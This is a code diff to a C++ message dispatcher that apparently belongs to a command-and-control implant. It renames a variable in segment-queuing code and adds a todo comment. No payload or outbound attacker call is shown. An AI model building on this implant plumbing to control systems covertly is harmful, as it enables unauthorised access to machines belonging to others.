@@ -99,7 +99,7 @@ namespace Dispatcher {
     VOID QueueSegments(uint8_t *const buffer, uint32_t length) {
         HEXANE
 
-        _stream *entry = { };
+        _stream *queue = { };
 
         uint32_t offset     = 0;
         uint32_t peer_id    = 0;
@@ -114,25 +114,25 @@ namespace Dispatcher {
                 ? MESSAGE_MAX - SEGMENT_HEADER_SIZE
                 : length;
 
-            entry = S_CAST(_stream*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cb_seg + SEGMENT_HEADER_SIZE));
+            queue = S_CAST(_stream*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, cb_seg + SEGMENT_HEADER_SIZE));
 
             x_memcpy(&peer_id, buffer, 4);
             x_memcpy(&task_id, buffer + 4, 4);
 
-            entry->PeerId    = peer_id;
-            entry->TaskId    = task_id;
-            entry->MsgType   = TypeSegment;
+            queue->PeerId    = peer_id;
+            queue->TaskId    = task_id;
+            queue->MsgType   = TypeSegment;
 
-            Stream::PackDword(entry, index);
-            Stream::PackDword(entry, n_seg);
-            Stream::PackDword(entry, cb_seg);
-            Stream::PackBytes(entry, B_PTR(buffer) + offset, cb_seg);
+            Stream::PackDword(queue, index);
+            Stream::PackDword(queue, n_seg);
+            Stream::PackDword(queue, cb_seg);
+            Stream::PackBytes(queue, B_PTR(buffer) + offset, cb_seg);
 
             index++;
             length -= cb_seg;
             offset += cb_seg;
 
-            AddMessage(entry);
+            AddMessage(queue);
         }
     }
 
@@ -202,6 +202,7 @@ namespace Dispatcher {
         out = nullptr;
 
         if (in) {
+            //todo: do not clear the queue, just remove n entries
             ClearQueue();
 
             if (PeekPID(in)) {
